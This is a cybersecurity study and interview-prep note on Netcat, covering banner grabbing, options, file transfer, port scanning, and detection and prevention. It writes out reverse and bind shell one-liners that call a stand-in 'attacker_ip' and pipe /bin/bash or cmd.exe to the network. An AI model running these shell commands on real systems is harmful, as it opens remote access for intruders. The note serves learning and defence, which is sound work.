---
tags:
  - "#networking/tools"
  - "#cybersecurity/red-team/recon"
  - "#interview/concepts"
aliases:
  - nc
  - ncat
  - Swiss Army Knife
---

# Netcat (nc)

> **One-liner:** A versatile networking utility for reading/writing data across TCP/UDP connections—the "Swiss Army knife" of networking.

## 🎯 What Is It?
Netcat (or `nc`) is a command-line utility that reads and writes data across network connections using TCP or UDP. It can function as both a client and a server, making it invaluable for [[Banner Grabbing]], file transfers, port scanning, and creating reverse shells.

## 🤔 Why It Matters
- **Reconnaissance:** [[Banner Grabbing]] to identify service versions
- **Exploitation:** Create bind/reverse shells during pentests
- **File Transfer:** Move files between systems without additional tools
- **Debugging:** Test network connectivity and services
- **Versatility:** Works with any TCP/UDP protocol

## 🔬 How It Works

### Core Modes
| Mode | Description | Example |
|------|-------------|---------|
| **Client** | Connect to listening port | `nc target 80` |
| **Server** | Listen for connections | `nc -lvnp 4444` |

### Banner Grabbing
```bash
# HTTP Banner
nc 10.10.10.1 80
GET / HTTP/1.1
Host: target
# Press Enter twice

# FTP Banner  
nc 10.10.10.1 21
# Server responds with version info
```

### Key Options
| Option | Meaning |
|--------|---------|
| `-l` | Listen mode (server) |
| `-v` | Verbose output |
| `-n` | No DNS resolution |
| `-p` | Specify port |
| `-e` | Execute program on connect |
| `-u` | Use UDP instead of TCP |
| `-w` | Timeout in seconds |
| `-k` | Keep listening after disconnect |

## 🔬 Common Use Cases

### Reverse Shell (Attacker)
```bash
# Attacker listens
nc -lvnp 4444

# Victim connects back (Linux)
nc attacker_ip 4444 -e /bin/bash

# Victim connects back (Windows)
nc.exe attacker_ip 4444 -e cmd.exe
```

### Bind Shell
```bash
# Victim listens
nc -lvnp 4444 -e /bin/bash

# Attacker connects
nc victim_ip 4444
```

### File Transfer
```bash
# Receiver (listening)
nc -lvnp 4444 > received_file.txt

# Sender
nc target_ip 4444 < file_to_send.txt
```

### Port Scanning
```bash
# Basic port scan
nc -zv target 20-25

# With timeout
nc -zvw1 target 80 443 8080
```

## 🛡️ Detection & Prevention

### How to Detect
- Monitor for netcat process execution
- Alert on unusual outbound connections to high ports
- Detect shell commands following TCP connections
- EDR signatures for nc.exe or ncat.exe

### How to Prevent / Mitigate
- Remove netcat from production systems
- Block unnecessary outbound connections
- Monitor for encoded/obfuscated netcat alternatives
- Application whitelisting

## 🎤 Interview Angles

### Common Questions
- "What is Netcat used for?"
  - Banner grabbing, reverse shells, file transfers, port scanning, network debugging.
- "How would you set up a reverse shell with Netcat?"
  - Attacker: `nc -lvnp 4444` | Victim: `nc attacker_ip 4444 -e /bin/bash`
- "Difference between bind shell and reverse shell?"
  - Bind: victim listens, attacker connects. Reverse: attacker listens, victim connects out.

### STAR Story
> **Situation:** During a pentest, firewall blocked all inbound connections to compromised host.
> **Task:** Establish persistent access despite inbound filtering.
> **Action:** Used Netcat reverse shell—victim connected outbound to my listener on port 443 (allowed for HTTPS).
> **Result:** Maintained access through firewall; documented egress filtering gap for client.

## ✅ Best Practices
- Use `-v` for verbose output during debugging
- Use `-n` to avoid DNS lookups and warnings
- Ports < 1024 require root/admin privileges
- Consider `ncat` (Nmap's netcat) for SSL support

## ❌ Common Misconceptions
- "Netcat is only for hackers" — It's a legitimate network debugging tool
- "Netcat always requires `-e` for shells" — Can pipe to bash: `nc -lvnp 4444 | /bin/bash`

## 🔗 Related Concepts
- [[Banner Grabbing]]
- [[Active Reconnaissance]]
- [[Telnet]]
- [[Reverse Shell]]
- [[Command and Control (C2)]]

## 📚 References
- Netcat Manual Pages
- TryHackMe - Active Reconnaissance Room
